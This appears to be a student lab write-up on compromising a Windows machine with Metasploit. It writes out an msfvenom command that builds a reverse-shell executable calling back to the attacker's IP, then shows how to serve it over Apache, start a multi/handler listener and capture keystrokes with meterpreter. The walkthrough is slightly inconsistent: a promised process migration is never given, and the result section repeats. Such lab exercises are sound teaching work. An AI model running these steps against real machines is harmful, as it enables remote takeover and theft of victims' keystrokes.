# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
![Alt text](img/ifconfigl.png)


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
![Alt text](<img/msfvenom -p windows.png>)

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
![Alt text](img/2.png)

Start apache server
sudo systemctl apache2 start

Check the status of apache2
## OUTPUT:
![Alt text](<img/sudo systemctl.png>)

Invoke msfconsole:
## OUTPUT:
![Alt text](img/qnmark.png)



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
![Alt text](img/?cmds.png)


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
![Alt text](img/exploit_multihandler.png)



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:
![Alt text](img/apache2.png)


Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:
![Alt text](img/funexe.png)


On kali/parrot give the command exploit
## OUTPUT:
![Alt text](img/exploit_multihandler.png)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:
![Alt text](img/ps.png)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:
![Alt text](img/netstat.png)


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="427" height="45" alt="image" src="https://github.com/user-attachments/assets/db0fb274-1fc8-4794-ae9e-b6837e80bc78" />




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
<img width="533" height="123" alt="image" src="https://github.com/user-attachments/assets/1c2af1ec-21c0-4c9b-95f3-58aa5ebd0881" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
